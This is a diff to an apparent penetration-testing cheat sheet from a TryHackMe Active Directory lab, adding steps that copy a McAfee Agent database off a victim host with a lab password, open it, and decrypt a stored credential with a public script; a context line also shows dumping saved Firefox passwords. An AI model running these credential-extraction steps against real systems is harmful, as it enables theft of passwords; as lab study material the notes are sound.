@@ -51,3 +51,54 @@ This will show any passwords saved in Firefox
 git clone https://github.com/unode/firefox_decrypt.git
 python3.9 firefox_decrypt.py ./
 ```
+
+
+
+
+
+## Configuration Files
+
+### McAfee Agent
+
+**Examples**
+
+[#configuration-files](../../walkthroughs/tryhackme/breaching-active-directory.md#configuration-files "mention")
+
+**Victim**
+
+```
+cd C:\ProgramData\McAfee\Agent\DB
+```
+
+**Victim**
+
+```
+scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
+Password: Password1@
+```
+
+**Kali**
+
+```
+sqlitebrowser ma.db
+```
+
+**Kali**
+
+```
+cp /root/Rooms/BreachingAD/task7/mcafeesitelistpwddecryption.zip .
+unzip mcafeesitelistpwddecryption.zip
+```
+
+<figure><img src="../../.gitbook/assets/image (4) (1) (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+python2 mcafee-sitelist-pwd-decryption-master/mcafee_sitelist_pwd_decrypt.py  jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
+```
+
+<figure><img src="../../.gitbook/assets/image (18) (7).png" alt=""><figcaption></figcaption></figure>
+
+a
+
